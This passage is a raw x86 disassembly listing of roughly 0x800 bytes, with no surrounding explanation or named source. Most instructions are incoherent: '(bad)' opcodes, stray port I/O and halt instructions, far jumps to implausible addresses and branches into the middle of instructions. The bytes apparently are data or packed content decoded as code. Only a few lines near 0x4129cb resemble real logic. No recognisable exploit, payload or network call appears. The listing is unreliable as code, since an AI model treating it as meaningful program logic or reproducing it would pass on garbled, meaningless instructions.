  4125bf:	push   esp
  4125c0:	add    ebp,ebx
  4125c2:	rol    BYTE PTR [edx+0x31],1
  4125c5:	fist   WORD PTR [edi-0x20122205]
  4125cb:	addr16 aam 0xc1
  4125ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125cf:	pop    edx
  4125d0:	mov    cl,0xea
  4125d2:	loop   0x412614
  4125d4:	je     0x41261b
  4125d6:	retf   
  4125d7:	pop    ss
  4125d8:	cmp    BYTE PTR [ecx-0x1cdb2eaf],0x45
  4125df:	sbb    eax,0x4a6865f
  4125e4:	into   
  4125e5:	nop
  4125e6:	xlat   BYTE PTR ds:[ebx]
  4125e7:	nop
  4125e8:	dec    esp
  4125e9:	pushf  
  4125ea:	push   0x8
  4125ec:	ss dec esp
  4125ee:	add    DWORD PTR [ecx],esp
  4125f0:	sbb    ebp,edx
  4125f2:	fisubr DWORD PTR [edi+0x78]
  4125f5:	push   0x62
  4125f7:	dec    ecx
  4125f8:	pop    ss
  4125f9:	sub    BYTE PTR [eax],bh
  4125fb:	enter  0x62c2,0x1d
  4125ff:	mov    bl,0x7c
  412601:	into   
  412602:	test   ebp,edi
  412604:	loopne 0x4125b8
  412606:	mov    cl,0x52
  412608:	push   edi
  412609:	bound  edi,QWORD PTR [esi+ebx*4+0x753327fc]
  412610:	or     eax,0x98831987
  412615:	test   BYTE PTR ds:0x9ebc8aeb,dh
  41261b:	aas    
  41261c:	pop    edx
  41261d:	push   ebp
  41261e:	imul   esp,DWORD PTR [edi-0x4b6c2292],0xe40b52f4
  412628:	dec    ebp
  412629:	sub    ebx,DWORD PTR [ebx-0x39185e51]
  41262f:	sbb    esi,DWORD PTR [ebp+0x77]
  412632:	mov    edi,0xb1729330
  412637:	out    0xad,al
  412639:	aaa    
  41263a:	pop    ebx
  41263b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41263c:	push   0x41
  41263e:	ja     0x412692
  412640:	(bad)  
  412641:	leave  
  412642:	ret    0xb352
  412645:	fld    DWORD PTR [ebx-0x2c388c3b]
  41264b:	fwait
  41264c:	int    0x15
  41264e:	push   edi
  41264f:	fild   WORD PTR [ebp+0x3176adfc]
  412655:	iret   
  412656:	jno    0x4126bd
  412658:	stc    
  412659:	ss in  eax,0x76
  41265c:	mov    esi,DWORD PTR [edx+0x428bbe54]
  412662:	and    dh,al
  412664:	retf   
  412665:	jmp    0x4126d3
  412667:	adc    dh,BYTE PTR [ecx-0x2f1ca53d]
  41266d:	jecxz  0x412662
  41266f:	sbb    DWORD PTR [esi],ebx
  412671:	out    0xc0,eax
  412673:	fwait
  412674:	sub    dl,ch
  412676:	cmp    esi,edx
  412678:	fild   DWORD PTR [edx+0x8]
  41267b:	or     BYTE PTR [ebp+esi*4+0x38],dh
  41267f:	and    edi,ebx
  412681:	dec    ebx
  412682:	inc    edi
  412683:	ins    DWORD PTR es:[edi],dx
  412684:	cwde   
  412685:	jge    0x412690
  412687:	xchg   esi,eax
  412688:	fs (bad) 
  41268a:	in     al,dx
  41268b:	xor    al,0x6f
  41268d:	pop    ds
  41268e:	xor    eax,0x20c0dd30
  412693:	or     edi,ecx
  412695:	clc    
  412696:	ret    0xf43b
  412699:	in     eax,dx
  41269a:	mov    eax,ds:0x37711fb6
  41269f:	pop    ecx
  4126a0:	loop   0x4126a6
  4126a2:	cdq    
  4126a3:	mov    DWORD PTR [ebx+0x4],ebx
  4126a6:	pop    esi
  4126a7:	rep outs dx,DWORD PTR ds:[esi]
  4126a9:	add    ah,BYTE PTR ds:0xb566e013
  4126af:	in     eax,0x98
  4126b1:	xor    ecx,esp
  4126b3:	add    eax,0xba6a2c0a
  4126b8:	(bad)  
  4126b9:	enter  0xc3e3,0xd1
  4126bd:	gs push ecx
  4126bf:	sub    DWORD PTR [esi+eax*2+0x23],eax
  4126c3:	inc    eax
  4126c4:	les    ebx,FWORD PTR [edi]
  4126c6:	(bad)  
  4126c7:	inc    ebp
  4126c8:	push   ds
  4126c9:	stos   DWORD PTR es:[edi],eax
  4126ca:	aas    
  4126cb:	push   0xf24d59ed
  4126d0:	sub    eax,0xd1bee3cb
  4126d5:	inc    eax
  4126d6:	sbb    eax,DWORD PTR [edi]
  4126d8:	pop    ecx
  4126d9:	or     al,0xd1
  4126db:	outs   dx,BYTE PTR ds:[esi]
  4126dc:	xchg   ebp,eax
  4126dd:	dec    edx
  4126de:	pop    esi
  4126df:	inc    edx
  4126e0:	xchg   edi,eax
  4126e1:	call   0xc0a0:0xbd0b1d85
  4126e8:	cmp    esi,esi
  4126ea:	sub    ah,bl
  4126ec:	and    ebx,DWORD PTR [eax+0x42578498]
  4126f2:	sahf   
  4126f3:	inc    ebx
  4126f4:	xor    eax,0x200dcb13
  4126f9:	xor    DWORD PTR [edi-0xe364540],edx
  4126ff:	arpl   WORD PTR [edi+0x7],bp
  412702:	xchg   edx,eax
  412703:	add    esp,DWORD PTR [edi]
  412705:	push   ss
  412706:	inc    esi
  412707:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412708:	add    DWORD PTR [ebp-0x4],edx
  41270b:	popf   
  41270c:	xlat   BYTE PTR ds:[ebx]
  41270d:	mov    ebx,0x520a8022
  412712:	je     0x4126d0
  412714:	sub    esp,DWORD PTR [edi-0xcdffd78]
  41271a:	push   esi
  41271b:	push   esp
  41271c:	inc    ebx
  41271d:	adc    edi,ebp
  41271f:	imul   edi,edi,0x5b
  412722:	call   0x9daa4d35
  412727:	out    dx,eax
  412728:	les    ebp,FWORD PTR ds:0x27199b0f
  41272e:	mov    ch,0x12
  412730:	imul   esp,ebx,0xc7954fb2
  412736:	inc    ebp
  412737:	hlt    
  412738:	cmp    DWORD PTR [ebp+0x45c7f89c],eax
  41273e:	mov    esp,0xf89c853a
  412743:	jmp    0x4129cb
  412748:	int    0xcb
  41274a:	ror    esp,0xd9
  41274d:	fcmove st,st(5)
  41274f:	leave  
  412750:	sub    al,0xaa
  412752:	(bad)  
  412754:	sbb    al,0x37
  412756:	movaps XMMWORD PTR [edx-0x1a878794],xmm5
  41275d:	jle    0x4127d7
  41275f:	js     0x412789
  412761:	fist   DWORD PTR [ebx-0x4cbae2f1]
  412767:	xchg   ebp,eax
  412768:	pop    edi
  412769:	or     eax,0x7907908a
  41276e:	loope  0x412737
  412770:	fldenv [eax]
  412772:	sbb    DWORD PTR [edx-0x55],edx
  412775:	std    
  412776:	in     eax,0xaf
  412778:	shl    BYTE PTR [ebx],cl
  41277a:	ret    
  41277b:	inc    cx
  41277d:	push   ecx
  41277e:	mov    ebp,0x7e798c60
  412783:	aad    0x2
  412785:	xchg   ebx,eax
  412786:	mov    ah,0xf3
  412788:	xchg   ecx,eax
  412789:	sbb    BYTE PTR [edi],0x59
  41278c:	outs   dx,BYTE PTR ds:[esi]
  41278d:	mov    edi,0xfb16f8a
  412792:	add    eax,0x8af285c0
  412797:	sub    eax,DWORD PTR [ecx]
  412799:	sbb    ebx,DWORD PTR [edx]
  41279b:	in     eax,0xd3
  41279d:	hlt    
  41279e:	and    esi,0x54
  4127a1:	fdiv   DWORD PTR [eax-0x353171fb]
  4127a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127a8:	push   ebp
  4127a9:	and    edx,eax
  4127ab:	ins    DWORD PTR es:[edi],dx
  4127ac:	test   BYTE PTR [esi+0x30991192],al
  4127b2:	stos   DWORD PTR es:[edi],eax
  4127b3:	fbld   TBYTE PTR [ebp-0x2b76a883]
  4127b9:	lods   al,BYTE PTR ds:[esi]
  4127ba:	mov    ch,0x88
  4127bc:	jns    0x412802
  4127be:	xor    bh,bh
  4127c0:	gs pop ebp
  4127c2:	xchg   edx,eax
  4127c3:	outs   dx,DWORD PTR ds:[esi]
  4127c4:	pop    ds
  4127c5:	pusha  
  4127c6:	or     edx,esp
  4127c8:	xchg   ecx,eax
  4127c9:	daa    
  4127ca:	jge    0x4127ed
  4127cc:	jbe    0x41275a
  4127ce:	xchg   dh,bh
  4127d0:	jbe    0x41277c
  4127d2:	aam    0x83
  4127d4:	(bad)  
  4127d7:	cmp    BYTE PTR [edi-0x7b98dfe3],bh
  4127dd:	mov    ebp,DWORD PTR [ecx]
  4127df:	js     0x412774
  4127e1:	and    edi,eax
  4127e3:	pop    ebp
  4127e4:	inc    esp
  4127e5:	mov    BYTE PTR [ebp+0x53],cl
  4127e8:	xchg   ecx,eax
  4127e9:	outs   dx,BYTE PTR ds:[esi]
  4127ea:	sub    edi,ebx
  4127ec:	pop    es
  4127ed:	lods   eax,DWORD PTR ds:[esi]
  4127ef:	dec    ebp
  4127f0:	cdq    
  4127f1:	ins    BYTE PTR es:[edi],dx
  4127f2:	inc    ebx
  4127f3:	rol    dh,0x13
  4127f6:	jmp    0xd5b2081
  4127fb:	or     al,BYTE PTR [edx-0x2c]
  4127fe:	js     0x412861
  412800:	inc    edx
  412801:	loopne 0x412859
  412803:	popa   
  412804:	lock mov dh,0xf1
  412807:	es (bad) 
  412809:	(bad)  
  41280a:	cmp    esp,DWORD PTR [ebp+0x10]
  41280d:	or     eax,0x3fe5f747
  412812:	mov    ch,0xb2
  412814:	shl    BYTE PTR [esi],1
  412816:	lahf   
  412817:	or     al,0x8
  412819:	mov    al,ds:0x14bf0eb7
  41281e:	stc    
  41281f:	je     0x41282f
  412821:	hlt    
  412822:	inc    esi
  412823:	je     0x4127d7
  412825:	cwde   
  412826:	sub    ah,BYTE PTR [eax+0x30dae03e]
  41282c:	clc    
  41282d:	pop    esp
  41282e:	call   0x3cd190bd
  412833:	enter  0xd99b,0xd6
  412837:	aas    
  412838:	jne    0x412890
  41283a:	sti    
  41283b:	pop    ds
  41283c:	jl     0x4127e0
  41283e:	xchg   edi,eax
  41283f:	xchg   di,ax
  412841:	inc    eax
  412842:	pop    ss
  412843:	fisubr DWORD PTR [esi]
  412845:	add    ecx,0xf0296ad8
  41284b:	das    
  41284c:	test   DWORD PTR [edi],ecx
  41284e:	jmp    0x636d:0x3fe2745c
  412855:	add    DWORD PTR [edi],edx
  412857:	fnstcw WORD PTR gs:[edx-0x25]
  41285b:	jo     0x412827
  41285d:	pop    edi
  41285e:	mov    es,WORD PTR [ecx]
  412860:	jge    0x4127f0
  412862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412863:	add    BYTE PTR [edx],dl
  412865:	call   0xdea45ba4
  41286a:	mov    ch,0x86
  41286c:	daa    
  41286d:	and    al,0x5b
  41286f:	and    al,0xb9
  412871:	inc    ecx
  412872:	pop    es
  412873:	in     eax,dx
  412874:	retf   0xc44b
  412877:	xchg   ebx,eax
  412878:	push   cs
  412879:	jnp    0x41288f
  41287b:	pop    es
  41287c:	mov    WORD PTR [eax-0x1f7aa904],ss
  412882:	stos   BYTE PTR es:[edi],al
  412883:	pop    ss
  412884:	dec    edx
  412885:	popa   
  412886:	inc    eax
  412887:	aam    0xdb
  412889:	dec    eax
  41288a:	mov    al,ds:0x97599897
  41288f:	mov    ebp,0x195661b4
  412894:	xor    esp,edi
  412896:	jmp    0xe7d9fd57
  41289b:	mov    ch,ah
  41289d:	xchg   edx,eax
  41289e:	int3   
  41289f:	mov    edi,ebp
  4128a1:	dec    ebp
  4128a2:	cdq    
  4128a3:	mov    ah,0xeb
  4128a5:	jg     0x41285e
  4128a7:	rcr    DWORD PTR [ecx],cl
  4128a9:	hlt    
  4128aa:	scas   eax,DWORD PTR es:[edi]
  4128ab:	add    al,0x17
  4128ad:	adc    al,0x55
  4128af:	jbe    0x4128d9
  4128b1:	add    ebp,esp
  4128b3:	sbb    ch,BYTE PTR [esi]
  4128b5:	das    
  4128b6:	pusha  
  4128b7:	aas    
  4128b8:	mov    ebp,0x4105358b
  4128bd:	jb     0x41288c
  4128bf:	repnz dec esp
  4128c1:	push   esp
  4128c2:	fmul   DWORD PTR [ebp-0x4627bdc7]
  4128c8:	cwde   
  4128c9:	scas   eax,DWORD PTR es:[edi]
  4128ca:	stos   DWORD PTR es:[edi],eax
  4128cb:	or     eax,DWORD PTR [edi+0x7e8a76c0]
  4128d1:	(bad)  
  4128d2:	lock push ebp
  4128d4:	stos   BYTE PTR es:[edi],al
  4128d5:	push   ebp
  4128d6:	mov    bh,0x9d
  4128d8:	inc    edx
  4128d9:	inc    cl
  4128db:	shl    esi,cl
  4128dd:	div    DWORD PTR [eax-0x5b]
  4128e0:	cmp    edx,edx
  4128e2:	jle    0x412940
  4128e4:	fadd   QWORD PTR [edx-0x57]
  4128e7:	xchg   edi,eax
  4128e8:	dec    ebp
  4128e9:	aaa    
  4128ea:	xor    eax,0xe5041545
  4128ef:	addr16 out dx,al
  4128f1:	xor    BYTE PTR [edi],ah
  4128f3:	xchg   esi,eax
  4128f4:	mov    ch,0x6a
  4128f6:	fmul   st(5),st
  4128f8:	jecxz  0x41293d
  4128fa:	jmp    0xe47e7ae7
  4128ff:	xchg   edi,eax
  412900:	addr16 fwait
  412902:	cdq    
  412903:	scas   al,BYTE PTR es:[edi]
  412904:	inc    ebx
  412905:	pop    esi
  412906:	and    esi,DWORD PTR [eax]
  412908:	jge    0x412924
  41290a:	adc    eax,0xf1e44ef4
  41290f:	sahf   
  412910:	and    eax,0x75354c0e
  412915:	add    ebx,DWORD PTR [ebp-0x6a093a88]
  41291b:	rcl    DWORD PTR [esi+0x6c],0x86
  41291f:	retf   
  412920:	mov    esp,0xe258565
  412925:	and    DWORD PTR [esi-0x45],0x48
  412929:	dec    edi
  41292a:	mov    ah,0x6d
  41292c:	mov    esi,0x1c256dac
  412931:	ret    
  412932:	push   es
  412933:	scas   al,BYTE PTR es:[edi]
  412934:	fld    TBYTE PTR [ebx+0x3ec1029e]
  41293a:	mov    ebx,DWORD PTR cs:[eax+0x3a]
  41293e:	sbb    DWORD PTR [ecx+0x3be4bc8f],eax
  412944:	std    
  412945:	(bad)  
  412946:	or     ebx,DWORD PTR [ecx+0x48]
  412949:	or     al,0x6e
  41294b:	out    dx,al
  41294c:	scas   al,BYTE PTR es:[edi]
  41294d:	inc    esp
  41294e:	test   DWORD PTR [ebp+0x59],esi
  412951:	stc    
  412952:	lock clc 
  412954:	xchg   ebx,eax
  412955:	and    DWORD PTR [ecx-0x61ba51ad],0xd2027ce5
  41295f:	pop    es
  412960:	cmp    cl,BYTE PTR [ebx+0x79292c24]
  412966:	aad    0x86
  412968:	mov    ds:0x82acfdef,eax
  41296d:	sub    ecx,0x675410e
  412973:	add    DWORD PTR [ebx-0x65],0x902947
  41297a:	push   0x880f6ce8
  41297f:	pop    edi
  412980:	and    cl,BYTE PTR [eax]
  412982:	test   DWORD PTR [eax-0x2cd9f226],0x25e15dff
  41298c:	repz scas eax,DWORD PTR es:[edi]
  41298e:	push   ebx
  41298f:	mov    ebx,0xf2194fd6
  412994:	(bad)  
  412995:	jae    0x41292b
  412997:	push   ebp
  412998:	out    dx,al
  412999:	lds    esp,FWORD PTR [esp+ecx*4-0x3d]
  41299d:	neg    DWORD PTR [edi]
  41299f:	fwait
  4129a0:	out    dx,al
  4129a1:	pushf  
  4129a2:	push   ss
  4129a3:	icebp  
  4129a4:	pop    edi
  4129a5:	xor    BYTE PTR [ebx],al
  4129a7:	es hlt 
  4129a9:	add    eax,DWORD PTR [edi-0x5c1478ea]
  4129af:	push   0x9a51682e
  4129b4:	retf   0x539e
  4129b7:	dec    ebp
  4129b8:	jle    0x412a0d
  4129ba:	outs   dx,BYTE PTR ds:[esi]
  4129bb:	push   ds
  4129bc:	outs   dx,DWORD PTR ds:[esi]
  4129bd:	dec    edi
  4129be:	mov    bl,0x72
  4129c0:	lar    esi,WORD PTR [edx-0x37c98075]
  4129c7:	xor    edx,DWORD PTR [edx]
  4129c9:	loope  0x4129fd
  4129cb:	mov    edx,DWORD PTR [ebp-0x18]
  4129ce:	xor    edx,eax
  4129d0:	add    edx,ecx
  4129d2:	jmp    0x41396f
  4129d7:	mov    edx,DWORD PTR [ebp-0x18]
  4129da:	xor    edx,eax
  4129dc:	add    edx,DWORD PTR [ebp-0x14]
  4129df:	jmp    0x412c67
  4129e4:	(bad)
  4129e7:	ret    0xc1ca
  4129ea:	(bad)
  4129ed:	xlat   BYTE PTR ds:[ebx]
  4129ee:	data16 ja 0x4129de
  4129f1:	cwde   
  4129f2:	stos   BYTE PTR es:[edi],al
  4129f3:	leave  
  4129f4:	pop    ss
  4129f5:	jno    0x412a6f
  4129f7:	js     0x4129de
  4129f9:	jle    0x412a73
  4129fb:	js     0x41299f
  4129fd:	aas    
  4129fe:	inc    ebp
  4129ff:	(bad)
  412a02:	pop    ss
  412a03:	mov    al,0xbf
  412a05:	jp     0x412998
  412a07:	daa    
  412a08:	(bad)  [esi+0x45]
  412a0b:	mov    bh,0xc3
  412a0d:	cld    
  412a0e:	retf   0xa36
  412a11:	add    dl,BYTE PTR [ebx+ebx*8+0x68]
  412a15:	sbb    cl,ah
  412a17:	mov    bl,0xed
  412a19:	outs   dx,DWORD PTR ds:[esi]
  412a1a:	in     eax,dx
  412a1b:	mov    DWORD PTR [ecx],edx
  412a1d:	ds push es
  412a1f:	mov    cl,0xe8
  412a21:	arpl   WORD PTR [edx-0x54],dx
  412a24:	pusha  
  412a25:	cmp    DWORD PTR [esi],0xffffffd0
  412a28:	iret   
  412a29:	xchg   esp,eax
  412a2a:	scas   eax,DWORD PTR es:[edi]
  412a2b:	xlat   BYTE PTR ds:[ebx]
  412a2c:	xchg   ecx,eax
  412a2d:	ret    
  412a2e:	cwde   
  412a2f:	cdq    
  412a30:	retf   
  412a31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a32:	adc    BYTE PTR [eax+0x76],0x4d
  412a36:	out    0xe,eax
  412a38:	pusha  
  412a39:	dec    esi
  412a3a:	push   ss
  412a3b:	nop
  412a3c:	dec    edi
  412a3d:	push   DWORD PTR [edi+0x3f2122b]
  412a43:	loope  0x412a12
  412a45:	push   ecx
  412a46:	imul   ebp,DWORD PTR ds:0x68d9baf4,0xeb1bf485
  412a50:	mov    al,0x3
  412a52:	xor    eax,0x88ce687c
  412a57:	out    dx,al
  412a58:	cmc    
  412a59:	adc    BYTE PTR [esi-0x57b155c9],0x26
  412a60:	push   ds
  412a61:	cmp    dl,BYTE PTR [ecx+edx*2-0x7a]
  412a65:	sub    ch,ch
  412a67:	aam    0x93
  412a69:	pop    esi
  412a6a:	xor    bl,BYTE PTR [edi+esi*1+0x6c]
  412a6e:	sbb    ch,bl
  412a70:	dec    edi
  412a71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a72:	shl    esi,cl
  412a74:	daa    
  412a75:	push   ebp
  412a76:	adc    al,0x55
  412a78:	loopne 0x412af2
  412a7a:	jmp    FWORD PTR [edx+0x3f324f9e]
  412a80:	add    BYTE PTR [edi+0x1],al
  412a83:	shr    BYTE PTR [ebx+0x5d],1
  412a86:	int3   
  412a87:	push   edx
  412a88:	dec    edx
  412a89:	cwde   
  412a8a:	test   ecx,ebp
  412a8c:	xchg   ebx,eax
  412a8d:	jae    0x412a27
  412a8f:	add    ch,BYTE PTR [eax]
  412a91:	neg    BYTE PTR [edi-0x19758b3a]
  412a97:	xchg   edx,eax
  412a98:	fwait
  412a99:	and    eax,0x3e7f676e
  412a9e:	lahf   
  412a9f:	mov    ebx,0x1fe8083b
  412aa4:	int    0xf0
  412aa6:	sti    
  412aa7:	not    bl
  412aa9:	pop    ecx
  412aaa:	in     al,0xd3
  412aac:	enter  0x601,0x4f
  412ab0:	mov    BYTE PTR [edi+0x163778cf],al
  412ab6:	int    0x78
  412ab8:	push   si
  412aba:	jns    0x412aad
  412abc:	mov    edx,0xe541f245
  412ac1:	or     eax,0x1f916523
  412ac6:	std    
  412ac7:	les    esi,FWORD PTR [ecx+0x73]
  412aca:	jnp    0x412a87
  412acc:	sbb    cl,BYTE PTR [ebp+0x7a]
  412acf:	cs pop esp
  412ad1:	mov    ebp,0x3c3d3dc3
  412ad6:	xchg   BYTE PTR [ecx-0x42e7bde],dl
  412adc:	push   esi
  412add:	arpl   WORD PTR [edi+ebp*2],ax
  412ae0:	pushf  
  412ae1:	sub    cl,BYTE PTR ds:[esi+0x7d]
  412ae5:	adc    eax,esp
  412ae7:	rol    DWORD PTR [edx+esi*1],0x37
  412aeb:	popa   
  412aec:	jae    0x412b48
  412aee:	mov    eax,0xece84bd6
  412af3:	test   BYTE PTR [esi],dh
  412af5:	and    BYTE PTR [edx+0x31],0x54
  412af9:	mov    ebp,0x52a8f38
  412afe:	add    eax,DWORD PTR [edx]
  412b00:	mov    esp,0xc14a147b
  412b05:	jae    0x412a8e
  412b07:	sbb    al,0xa5
  412b09:	int    0xf6
  412b0b:	cld    
  412b0c:	ret    
  412b0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b0e:	push   edi
  412b0f:	jns    0x412acd
  412b11:	out    0x2e,eax
  412b13:	fwait
  412b14:	int3   
  412b15:	mov    BYTE PTR [edi-0x35],dl
  412b18:	mov    edi,0x71baf906
  412b1d:	xchg   ebx,ebx
  412b1f:	and    ch,BYTE PTR [ebp-0x6670adda]
  412b25:	loopne 0x412acc
  412b27:	pop    edi
  412b28:	fmul   st,st(4)
  412b2a:	add    ebp,DWORD PTR [ecx+edi*8+0x1756356]
  412b31:	loope  0x412b79
  412b33:	outs   dx,DWORD PTR ds:[esi]
  412b34:	fs mov ecx,0x46afe23f
  412b3a:	cld    
  412b3b:	mov    ds:0x623156dd,eax
  412b40:	leave  
  412b41:	out    dx,eax
  412b42:	bound  edi,QWORD PTR [eax]
  412b44:	and    al,0x7a
  412b46:	sbb    al,0xbf
  412b48:	push   DWORD PTR [ebx+0x47]
  412b4b:	dec    eax
  412b4c:	cmp    BYTE PTR [edx+0x2334f8eb],dl
  412b52:	jle    0x412b39
  412b54:	cdq    
  412b55:	sbb    eax,0xfda491fb
  412b5a:	adc    dh,BYTE PTR ds:0x2e4cb27d
  412b60:	mov    ds:0xba64aff3,eax
  412b65:	ja     0x412b2a
  412b67:	inc    ebx
  412b68:	fcomp  st(0)
  412b6a:	imul   eax,DWORD PTR [eax-0x643a0ec0],0x64a35586
  412b74:	retf   
  412b75:	mov    ebx,0xfc451c70
  412b7a:	test   BYTE PTR [edi+eax*1+0x6b],bh
  412b7e:	fistp  QWORD PTR [esi-0x16fbf396]
  412b84:	ror    esi,1
  412b86:	push   cs
  412b87:	loopne 0x412b6e
  412b89:	pop    esi
  412b8a:	pop    ds
  412b8b:	xchg   DWORD PTR [esi-0x68],ebx
  412b8e:	pop    edx
  412b8f:	rcl    dh,0x79
  412b92:	ror    dl,1
  412b94:	xchg   ecx,eax
  412b95:	mov    edi,0x98597302
  412b9a:	(bad)  
  412b9b:	(bad)  
  412b9c:	fidiv  WORD PTR [ebx-0xf]
  412b9f:	jne    0x412bef
  412ba1:	or     DWORD PTR [edx],ecx
  412ba3:	adc    BYTE PTR [esp+eiz*4+0x7c],cl
  412ba7:	imul   ebx,DWORD PTR [edx-0x5d27ea80],0x5f
  412bae:	lock xlat BYTE PTR ds:[ebx]
  412bb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bb1:	mov    BYTE PTR [ecx+0xe],dh
  412bb4:	mov    ds:0x98a35b98,eax
  412bb9:	icebp  
  412bba:	ds xchg ecx,eax
  412bbc:	aas    
  412bbd:	xor    eax,DWORD PTR [ecx+0x6c49fb]
  412bc3:	pop    ecx
  412bc4:	push   ebp
  412bc5:	mov    al,0x40
  412bc7:	cs es jp 0x412b85
  412bcb:	les    ebp,FWORD PTR [eax+eiz*1+0xd6afd0c]
  412bd2:	and    ebx,DWORD PTR [edi]
  412bd4:	jg     0x412b61
  412bd6:	sti    
  412bd7:	and    al,0xf8
  412bd9:	adc    cl,BYTE PTR [ecx-0x3a]
  412bdc:	outs   dx,BYTE PTR ds:[esi]
  412bdd:	push   cs
  412bde:	lods   eax,DWORD PTR ds:[esi]
  412bdf:	cmp    DWORD PTR [esi+0x79],eax
  412be2:	repz ret 0x2e0d
  412be6:	scas   eax,DWORD PTR es:[edi]
  412be7:	out    0x9f,al
  412be9:	push   es
  412bea:	pop    edx
  412beb:	adc    BYTE PTR fs:[edx],al
  412bee:	sbb    ebp,esi
  412bf0:	ins    BYTE PTR es:[edi],dx
  412bf1:	in     al,dx
  412bf2:	dec    ecx
  412bf3:	sub    BYTE PTR [edi+0x1b],ch
  412bf6:	ret    0x572e
  412bf9:	and    DWORD PTR [ecx],ebp
  412bfb:	std    
  412bfc:	jne    0x412c43
  412bfe:	pop    ecx
  412bff:	dec    ebx
  412c00:	mul    dl
  412c02:	inc    eax
  412c03:	jno    0x412c30
  412c05:	call   0x71262b71
  412c0a:	test   eax,0x22de3ed6
  412c0f:	mov    bl,0x87
  412c11:	mov    bh,0xcb
  412c13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c14:	push   edi
  412c15:	adc    al,0x58
  412c17:	pop    ecx
  412c18:	and    DWORD PTR [ebp+0x2757767c],edx
  412c1e:	cmp    al,0xf0
  412c20:	fidivr WORD PTR [ebx+0x8bf5057]
  412c26:	into   
  412c27:	pop    ds
  412c28:	cwde   
  412c29:	sbb    eax,0xdfb6598
  412c2e:	xor    DWORD PTR [eax],edx
  412c30:	fwait
  412c31:	add    al,BYTE PTR [ebx+ebp*2+0x7ed7eea8]
  412c38:	rcl    DWORD PTR [ebx-0x73460c42],cl
  412c3e:	pop    eax
  412c3f:	xor    dh,BYTE PTR [edi-0x39]
  412c42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c43:	fiadd  WORD PTR [eax-0x18]
  412c46:	mov    ds:0x4b96a770,eax
  412c4b:	or     ah,BYTE PTR [eax+0xf315be3]
  412c51:	je     0x412ca6
  412c53:	shl    cl,cl
  412c55:	inc    esp
  412c56:	inc    esi
  412c57:	jnp    0x412cb7
  412c59:	adc    ah,dl
  412c5b:	xor    DWORD PTR [edi+0x6086aa6c],ecx
  412c61:	in     eax,dx
  412c62:	jmp    0x7d8b:0x490b5613
  412c69:	in     al,0x8a
  412c6b:	xchg   esp,eax
  412c6c:	cmp    bl,BYTE PTR [eax-0x16ffcd8e]
  412c72:	add    DWORD PTR [edx],0x0
  412c75:	add    ch,cl
  412c77:	int3   
  412c78:	xlat   BYTE PTR ds:[ebx]
  412c79:	enter  0xdbd9,0xd5
  412c7d:	shl    DWORD PTR [ebx-0x62],1
  412c80:	std    
  412c81:	xchg   DWORD PTR [ebp-0x58],ebx
  412c84:	sbb    ecx,esi
  412c86:	cld    
  412c87:	ja     0x412d01
  412c89:	js     0x412c70
  412c8b:	jle    0x412d05
  412c8d:	js     0x412c45
  412c8f:	daa    
  412c90:	or     eax,0x36ba8f65
  412c95:	xor    edi,DWORD PTR [ebx+ebx*2-0x47de3b92]
  412c9c:	cmc    
  412c9d:	es mov ch,0x26
  412ca0:	out    0x94,al
  412ca2:	cwde   
  412ca3:	in     eax,0x5c
  412ca5:	fwait
  412ca6:	ret    0x425e
  412ca9:	lods   al,BYTE PTR ds:[esi]
  412caa:	jge    0x412ca0
  412cac:	pop    ebp
  412cad:	dec    esp
  412cae:	aad    0x6e
  412cb0:	dec    eax
  412cb1:	sub    al,BYTE PTR [edi+0x5dbea8f3]
  412cb7:	and    eax,0x81f4be0c
  412cbc:	lahf   
  412cbd:	movd   mm2,DWORD PTR [ecx-0x79]
  412cc1:	lahf   
  412cc2:	data16 rcr BYTE PTR [eax-0x122de3b8],0x53
  412cca:	ss fmul st(4),st
  412ccd:	call   0xe68ff4fc
  412cd2:	pushf  
  412cd3:	cmp    ebp,0xfffffff4
  412cd6:	dec    edx
  412cd7:	jo     0x412caf
  412cd9:	sub    BYTE PTR [edx-0x100370e4],al
  412cdf:	and    BYTE PTR ds:[eax-0x3462e247],cl
  412ce6:	imul   esi,esi,0x57ed0b9c
  412cec:	test   al,0xae
  412cee:	pop    edi
  412cef:	xchg   esi,eax
  412cf0:	xor    ah,dh
  412cf2:	jne    0x412cd6
  412cf4:	sbb    eax,0x95ebbb08
  412cf9:	sbb    DWORD PTR [esp+edx*8+0x1f0925f0],0xfffffffd
  412d01:	or     BYTE PTR [esi],bl
  412d03:	ret    0xd2c2
  412d06:	aas    
  412d07:	mov    dh,0xfd
  412d09:	mov    fs,WORD PTR [eax-0x390c6f3a]
  412d0f:	mov    ch,BYTE PTR [ebx]
  412d11:	daa    
  412d12:	or     edx,edx
  412d14:	sar    DWORD PTR [edi-0x3e980bb3],cl
  412d1a:	pop    ecx
  412d1b:	popf   
  412d1c:	stos   DWORD PTR es:[edi],eax
  412d1d:	cmp    dh,bl
  412d1f:	jo     0x412ce7
  412d21:	sar    BYTE PTR [eax+0x5],0x74
  412d25:	push   edi
  412d26:	inc    edx
  412d27:	lods   al,BYTE PTR ds:[esi]
  412d28:	fsubr  DWORD PTR [edi]
  412d2a:	pop    ebx
  412d2b:	mov    esi,0x35c1b1cc
  412d30:	scas   eax,DWORD PTR es:[edi]
  412d31:	mov    eax,ds:0x268ec2e
  412d36:	repnz into 
  412d38:	loop   0x412d39
  412d3a:	jo     0x412d5a
  412d3c:	lods   al,BYTE PTR ds:[esi]
  412d3d:	out    0x39,al
  412d3f:	jge    0x412d17
  412d41:	jmp    0x412d73
  412d43:	and    BYTE PTR [ebx],ch
  412d45:	fst    DWORD PTR [ebp-0x3d]
  412d48:	sbb    eax,0x898a2aeb
  412d4d:	(bad)  
  412d4e:	dec    eax
  412d4f:	out    dx,eax
  412d50:	out    dx,eax
  412d51:	mov    ah,0xda
  412d53:	pop    eax
  412d54:	shl    DWORD PTR [esi+eiz*2+0x38],1
  412d58:	not    DWORD PTR [ebx]
  412d5a:	xchg   ecx,eax
  412d5b:	inc    eax
